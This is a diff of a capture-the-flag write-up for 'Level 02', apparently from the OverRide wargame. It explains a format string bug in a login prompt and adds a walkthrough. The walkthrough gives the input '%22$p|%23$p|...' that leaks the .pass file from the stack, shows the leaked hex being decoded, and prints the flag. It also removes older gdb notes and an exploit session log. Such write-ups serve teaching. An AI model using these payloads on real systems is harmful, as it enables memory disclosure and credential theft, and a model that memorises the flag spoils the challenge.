@@ -1,72 +1,38 @@
-git clone https://github.com/longld/peda.git /tmp/debug/peda
-echo "source ~/peda/peda.py" >> /tmp/debug/.gdbinit
-echo "DONE! debug your program with gdb and enjoy"
+# Level 02
+
+## Vulnerability type:
+
+Format String Vulnerability
+
+##Walkthrough:
+
+The vulnerability occurs in the printf function, where the username, controlled by the user, is printed without proper formatting.
+The goal is to leak the contents of the .pass file stored in memory.
+Using format specifiers like `%p`, we calculate the number of specifiers needed to reach the desired memory location.
+By inputting `%22$p|%23$p|%24$p|%25$p|%26$p`, we can retrieve the memory content and later convert it to ASCII to obtain the .pass file.
+
+## Payload:
+
+Manually exploit by providing the input as described.
+Automate the exploit using Python and the pwn library.
 
 ```
-define all
-   x/4i $rip
-   echo \n
-   i r
-   echo \n
-   x/128wx $rsp
-end
-
-define nall
-   set $instr=$rip
-   ni
-   x/i $instr
-   all
-end
-
-```
-
-rbp 0x7fffffffe5d0
-
-pass file buffer = 0x7fffffffe500
-user buffer = 0x7fffffffe530
-
-rsp = 0x7fffffffe4b0
-
-python -c 'print "\xff\xff\xff\x7f\xb0\xe4" '
-
-```
-(gdb) p malloc(26)
-$14 = 6299664
-(gdb) p strcpy($14, "/home/users/level02/.pass")
-$15 = 6299664
-(gdb) set $eax=$14
-```
-
-```
-0x7fffffffe4f0:	0x00000000	0x00000001	0x00000000	0x00000000
-0x7fffffffe500:	0x4c427750	0x38614e67	0x544d3870	0x3735574b
-0x7fffffffe510:	0x787a3753	0x43514156	0x70436e78	0x714a3856
-0x7fffffffe520:	0x39735454	0x76424558	0x0000000a	0x00000000
-0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
-```
-
-```
-level02@OverRide:~$ ./level02
-===== [ Secure Access System v1.0 ] =====
-/***************************************\
-| You must login to access this system. |
-\**************************************/
---[ Username: AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
---[ Password:
-*****************************************
-AAAAAAAA0x7fffffffe4e0(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6d80x1f7ff9a08(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x4141414141414141 does not have access!
-```
-
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+```
 
+```
 75 6e 50 52 34 37 68 48 45 41 4a 35 61 73 39 51 37 7a 71 43 57 4e 67 58 35 4a 35 68 6e 47 58 73 48 33 67 50 66 4b 39 4d
+```
 
 https://www.convzone.com/hex-to-decimal/
 
+```
 117 110 80 82 52 55 104 72 69 65 74 53 97 115 57 81 55 122 113 67 87 78 103 88 53 74 53 104 110 71 88 115 72 51 103 80 102 75 57 77
+```
 
 https://www.browserling.com/tools/ascii-to-text
 
+```
 unPR47hH
 EAJ5as9Q
 7zqCWNgX
@@ -78,10 +44,11 @@ Q9sa5JAE
 XgNWCqz7
 sXGnh5J5
 M9KfPg3H
+```
 
 https://codebeautify.org/reverse-string
 
-Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
 
 ## ASM
 
